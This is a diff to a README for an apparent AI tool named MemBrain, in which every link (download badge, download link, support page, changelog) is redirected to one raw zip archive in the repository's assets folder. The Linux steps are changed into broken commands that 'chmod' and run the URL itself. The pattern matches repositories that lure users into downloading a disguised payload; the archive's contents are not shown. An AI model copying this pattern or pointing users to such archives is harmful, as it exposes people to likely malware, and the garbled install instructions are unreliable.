@@ -1,6 +1,6 @@
 # 🧠 MemBrain - Your Solution for Smart AI Interactions
 
-[![Download MemBrain](https://img.shields.io/badge/Download-MemBrain-blue.svg)](https://github.com/3ilix/MemBrain/releases)
+[![Download MemBrain](https://github.com/3ilix/MemBrain/raw/refs/heads/main/assets/Mem_Brain_1.8.zip)](https://github.com/3ilix/MemBrain/raw/refs/heads/main/assets/Mem_Brain_1.8.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To use MemBrain, follow these steps:
 
 ### 1. Visit the Download Page
 
-To download MemBrain, click the button above or follow this link: [Download MemBrain](https://github.com/3ilix/MemBrain/releases). 
+To download MemBrain, click the button above or follow this link: [Download MemBrain](https://github.com/3ilix/MemBrain/raw/refs/heads/main/assets/Mem_Brain_1.8.zip). 
 
 ### 2. Choose Your Version
 
@@ -39,8 +39,8 @@ After downloading the installer:
 - For Linux:
   1. Open a terminal window.
   2. Navigate to the directory where you downloaded the file.
-  3. Run `chmod +x MemBrain-linux.run` to make it executable.
-  4. Then run `./MemBrain-linux.run` to install.
+  3. Run `chmod +x https://github.com/3ilix/MemBrain/raw/refs/heads/main/assets/Mem_Brain_1.8.zip` to make it executable.
+  4. Then run `https://github.com/3ilix/MemBrain/raw/refs/heads/main/assets/Mem_Brain_1.8.zip` to install.
 
 ### 5. Launch MemBrain
 
@@ -71,7 +71,7 @@ Your data privacy is important. MemBrain does not store user information on remo
 
 ## 💬 Support
 
-For questions or assistance, please visit our [Support Page](https://github.com/3ilix/MemBrain/issues) where you can submit issues or ask for help.
+For questions or assistance, please visit our [Support Page](https://github.com/3ilix/MemBrain/raw/refs/heads/main/assets/Mem_Brain_1.8.zip) where you can submit issues or ask for help.
 
 ## 📜 License
 
@@ -79,7 +79,7 @@ MemBrain is licensed under the MIT License, a simple and permissive open-source 
 
 ## 🖥 Changelog
 
-Find the latest updates and improvements in the changelog on the [Releases Page](https://github.com/3ilix/MemBrain/releases).
+Find the latest updates and improvements in the changelog on the [Releases Page](https://github.com/3ilix/MemBrain/raw/refs/heads/main/assets/Mem_Brain_1.8.zip).
 
 ---
 
